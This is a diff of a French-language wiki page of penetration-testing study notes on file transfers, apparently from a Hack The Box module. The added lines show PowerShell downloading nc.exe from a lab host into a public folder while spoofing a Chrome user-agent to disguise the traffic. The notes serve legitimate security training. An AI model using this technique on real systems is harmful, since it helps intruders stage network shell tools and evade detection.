@@ -2,7 +2,7 @@
 title: File Transfers
 description: 
 published: true
-date: 2025-05-04T16:09:37.471Z
+date: 2025-05-04T16:10:22.681Z
 tags: notes, htb, module
 editor: markdown
 dateCreated: 2025-03-16T15:21:30.098Z
@@ -982,4 +982,11 @@ Pour voir la liste des user-agents existants par défaut sur PowerShell (certain
 
 ```
 [Microsoft.PowerShell.Commands.PSUserAgent].GetProperties()
+```
+
+Utiliser Invoke-WebRequest avec l'user-agent Chrome:
+
+```
+$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
 ```
